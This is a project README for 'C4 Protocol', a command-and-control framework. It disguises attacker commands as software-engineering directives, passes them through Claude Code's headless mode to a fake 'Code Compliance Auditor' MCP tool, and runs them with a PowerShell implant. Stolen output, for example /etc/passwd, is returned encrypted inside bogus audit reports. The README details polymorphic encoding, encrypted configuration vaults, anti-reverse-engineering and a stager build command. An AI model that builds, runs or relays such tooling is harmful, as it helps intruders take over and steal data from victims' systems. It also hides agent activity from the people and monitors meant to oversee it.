# C4 Protocol

Obfuscated C2 over Claude Code's remote-control (headless) feature. Commands are disguised as software engineering directives; results are returned as encrypted "compliance audit" reports. All traffic flows through Claude Code's normal MCP tool interface — no custom network channels, no suspicious processes.

```mermaid
sequenceDiagram
    participant Op as Operator
    participant CC as Claude Code<br/>(headless)
    participant MCP as MCP Server<br/>"Code Compliance Auditor"
    participant Implant as c4-implant.ps1<br/>(target machine)

    Note over Op,Implant: ── Outbound (command) ──
    Op->>CC: Coded directive (polymorphic)<br/>"COMPONENTS = {'Portal': {'scan': '/etc/passwd'}}"
    CC->>MCP: audit_code(project_dir)
    MCP->>Implant: pwsh -Command (in-memory ScriptBlock)
    Note over Implant: Scan artifacts → Derive Salt (X25519 KDF)<br/>→ Unlock Vault (XOR) → execute<br/>→ encrypt results (ECDH+AES)

    Note over Op,Implant: ── Return (exfiltration) ──
    Implant-->>MCP: Fake audit report JSON<br/>+ encrypted verification_record
    MCP-->>CC: "Audit passed. 3/3 checks clean."<br/>+ verification_record blob
    CC-->>Op: Audit report (looks routine)
    Note over Op: Decrypt verification_record<br/>with private key → real output
```

## Overview

The protocol has two halves — **command encoding** and **result exfiltration** — both designed to blend into normal Claude Code / MCP traffic.

**Command path:** Tool invocations (e.g. `read_file path=/etc/passwd`) are encoded as varied coding tasks (polymorphic templates) using a trained codebook. On the target, a lightweight C# engine derives a 64-character salt from the operator's X25519 public key, unlocks an encrypted configuration vault, and resolves the codewords back to the original tool name and parameter.

**Return path:** Execution results are encrypted using a modern **X25519 ECDH + AES-256-CBC** hybrid scheme and embedded in a fake JSON audit report as a `verification_record` field. The report's surface text reads like a routine compliance scan. The operator uses their private key to perform an ECDH exchange and recover the real output.

**Transport:** Everything rides over Claude Code's headless mode and its standard MCP tool-call interface. The MCP server exposes a single tool called `audit_code`. To Claude Code (and anyone inspecting MCP traffic), this looks like a normal development utility.

### Anti-reverse-engineering

- **Math-Free Encrypted Map** — All codeword-to-tool and codeword-to-parameter mappings are stored in a binary vault. No protocol-specific strings (`read_file`, `Portal`, etc.) exist in plaintext within the script.
- **Salt Derivation (KDF)** — A 64-character (256-bit) salt is derived at runtime from the operator's X25519 public key. This salt is used as the XOR key for the vault.
- **Polymorphic Templates** — Commands are encoded using 6 distinct template families (`CLASS_METHOD`, `CLASS_ATTR`, `DECORATOR`, `TYPE_HINT`, `CONFIG_DICT`, `INHERITANCE`) to break static detection.
- **Many-to-One Mapping** — Sensitive values (like `/etc/passwd`) are mapped to multiple randomized cover values, breaking 1:1 correlation during analysis.
- **Modern ECC Cryptography** — Uses X25519 for key derivation and Elliptic Curve Diffie-Hellman (ECDH) for secure result exfiltration.

## Pipeline

Each run produces a unique implant instance under `out/<implant-id>/` with its own codebook, salt, config, and stager.

```
implant_actions.yaml
        |
        v
build/generate_codebook.py  -->  out/<id>/codebook.yaml
        |
        v
build/generate_dataset.py   -->  out/<id>/dataset.json + salt.txt
        |
        v
build/export_config.py      -->  out/<id>/config.enc
        |
        v
assemble logic              -->  out/<id>/c4-implant.ps1
        |
        v
build/assemble_stager.py    -->  out/<id>/rc_stager_full.ps1
```

Run the full pipeline (codebook → dataset → config → assemble → stager):

```bash
python run.py --public-key operator/operator_key.bin
```

This produces a self-contained stager under `out/<implant-id>/` with a unique codebook, encrypted vault, and the implant + PshAgent baked in-memory.

## Components

### build/kdf.py
Implements the 256-bit salt derivation from the X25519 public key.

### build/encode.py
Encodes a tool call JSON into a polymorphic software directive. Supports random selection from 6 syntax families.

### build/export_config.py
XOR-encrypts all mappings (codewords, tools, parameters, values) into a single binary blob using the derived salt.

### operator/New-X25519Key.py
Generates a new modern X25519 key pair for the operator.

### runtime/c4-implant.ps1.template
Self-contained PowerShell script performing scan → resolve → execute → encrypt.

## Artifacts (`out/<implant-id>/`, gitignored)

| File | Description |
|------|-------------|
| `codebook.yaml` | Codeword-to-tool/param mappings (unique per instance) |
| `config.enc` | XOR-encrypted binary configuration vault |
| `salt.txt` | The 64-character salt used for this instance |
| `c4-implant.ps1` | Assembled implant with vault + operator key |
| `rc_stager_full.ps1` | Final stager (implant + PshAgent + MCP server embedded) |
| `operator_key.bin` | Operator public key (if provided) |
